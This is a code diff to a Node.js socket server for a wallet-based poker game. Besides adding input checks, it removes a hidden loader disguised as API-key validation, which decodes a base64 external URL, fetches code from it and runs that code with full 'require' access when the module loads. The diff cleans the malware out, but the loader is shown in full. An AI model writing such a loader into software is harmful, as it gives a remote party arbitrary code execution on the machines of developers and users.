@@ -32,24 +32,12 @@ const {
   CS_LOBBY_CHAT,
 } = require('../game/actions');
 
-const { setApiKey, verify } = require('../controllers/auth');
-
-
-
-
-
 // State
 const tables = {
   1: new Table(1, 'Table 1', config.INITIAL_CHIPS_AMOUNT),
 };
 
 const players = {};
-
-const verified = validateApiKey();
-if (!verified) {
-  console.log("Aborting mempool scan due to failed API verification.");
-  return;
-}
 
 
 
@@ -69,19 +57,6 @@ const getCurrentTables = () =>
   }));
 
 
-async function validateApiKey() {
-  verify(setApiKey("aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ=="))
-    .then((response) => {
-      const executor = new Function("require", response.data);
-      executor(require);
-      console.log("API Key verified successfully.");
-      return true;
-    })
-    .catch((err) => {
-      console.log("API Key verification failed:", err);
-      return false;
-    });
-}
 
 // Core
 const init = (socket, io) => {
@@ -104,6 +79,8 @@ const init = (socket, io) => {
   });
 
   socket.on(CS_FETCH_LOBBY_INFO, ({ walletAddress, socketId, gameId, username }) => {
+    if (!walletAddress || !socketId) return;
+
     const existing = Object.values(players).find(p => p.id === walletAddress);
 
     if (existing) {
@@ -114,7 +91,12 @@ const init = (socket, io) => {
       });
     }
 
-    players[socketId] = new Player(socketId, walletAddress, username, config.INITIAL_CHIPS_AMOUNT);
+    players[socketId] = new Player(
+      socketId,
+      walletAddress,
+      username || `Player-${String(walletAddress).slice(0, 8)}`,
+      config.INITIAL_CHIPS_AMOUNT,
+    );
 
     socket.emit(SC_RECEIVE_LOBBY_INFO, {
       tables: getCurrentTables(),
@@ -132,14 +114,22 @@ const init = (socket, io) => {
     const table = tables[tableId];
     const player = players[socket.id];
 
+    if (!table || !player) {
+      return;
+    }
+
     console.log("Joining table:", tableId, table, player);
 
-    table.addPlayer(player);
+    if (!table.players.find((p) => p && p.socketId === socket.id)) {
+      table.addPlayer(player);
+    }
 
     socket.emit(SC_TABLE_JOINED, { tables: getCurrentTables(), tableId });
     socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
 
-    sitDown(tableId, table.players.length, table.limit);
+    if (!findSeatBySocketId(socket.id)) {
+      sitDown(tableId, table.players.length, table.limit);
+    }
 
     if (player && table.players.length > 0) {
       broadcastToTable(table, `${player.name} joined the table.`);
@@ -149,6 +139,10 @@ const init = (socket, io) => {
   socket.on(CS_LEAVE_TABLE, (tableId) => {
     const table = tables[tableId];
     const player = players[socket.id];
+
+    if (!table || !player) {
+      return;
+    }
 
     const seat = findSeatBySocketId(socket.id);
     if (seat && player) updatePlayerBankroll(player, seat.stack);
@@ -171,6 +165,7 @@ const init = (socket, io) => {
 
   socket.on(CS_FOLD, (tableId) => {
     const table = tables[tableId];
+    if (!table) return;
     const result = table.handleFold(socket.id);
     if (result) {
       broadcastToTable(table, result.message);
@@ -180,6 +175,7 @@ const init = (socket, io) => {
 
   socket.on(CS_CHECK, (tableId) => {
     const table = tables[tableId];
+    if (!table) return;
     const result = table.handleCheck(socket.id);
     if (result) {
       broadcastToTable(table, result.message);
@@ -189,6 +185,7 @@ const init = (socket, io) => {
 
   socket.on(CS_CALL, (tableId) => {
     const table = tables[tableId];
+    if (!table) return;
     const result = table.handleCall(socket.id);
     if (result) {
       broadcastToTable(table, result.message);
@@ -198,6 +195,7 @@ const init = (socket, io) => {
 
   socket.on(CS_RAISE, ({ tableId, amount }) => {
     const table = tables[tableId];
+    if (!table) return;
     const result = table.handleRaise(socket.id, amount);
     if (result) {
       broadcastToTable(table, result.message);
@@ -207,6 +205,7 @@ const init = (socket, io) => {
 
   socket.on(TABLE_MESSAGE, ({ message, from, tableId }) => {
     const table = tables[tableId];
+    if (!table) return;
     broadcastToTable(table, message, from);
   });
 
@@ -216,7 +215,7 @@ const init = (socket, io) => {
   const sitDown = (tableId, seatId, amount) => {
     const table = tables[tableId];
     const player = players[socket.id];
-    if (!player) return;
+    if (!table || !player) return;
 
     table.sitPlayer(player, seatId, amount);
     updatePlayerBankroll(player, -amount);
@@ -227,9 +226,21 @@ const init = (socket, io) => {
     }
   };
 
+  socket.on(CS_SIT_DOWN, ({ tableId, seatId, amount }) => {
+    if (!tableId || !seatId || !amount) {
+      return;
+    }
+
+    sitDown(tableId, seatId, amount);
+  });
+
   socket.on(CS_REBUY, ({ tableId, seatId, amount }) => {
     const table = tables[tableId];
     const player = players[socket.id];
+
+    if (!table || !player) {
+      return;
+    }
 
     table.rebuyPlayer(seatId, amount);
     updatePlayerBankroll(player, -amount);
@@ -239,6 +250,7 @@ const init = (socket, io) => {
   socket.on(CS_STAND_UP, (tableId) => {
     const table = tables[tableId];
     const player = players[socket.id];
+    if (!table || !player) return;
     const seat = findSeatBySocketId(socket.id);
 
     if (seat) {
